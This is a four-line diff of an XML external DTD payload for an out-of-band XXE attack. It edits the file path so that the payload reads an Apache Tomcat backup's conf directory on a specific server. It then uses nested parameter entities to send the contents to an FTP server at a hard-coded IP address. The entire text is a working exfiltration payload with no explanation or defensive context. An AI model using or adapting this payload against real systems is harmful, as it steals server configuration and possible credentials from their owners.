@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///home/phicomm-expense/apache-tomcat_backup_201711091718"> 
+<!ENTITY % file SYSTEM "file:///home/phicomm-expense/apache-tomcat_backup_201711091718/conf"> 
 <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://176.122.168.149:333/%file;'>"> 
 %int; 
 %send; 
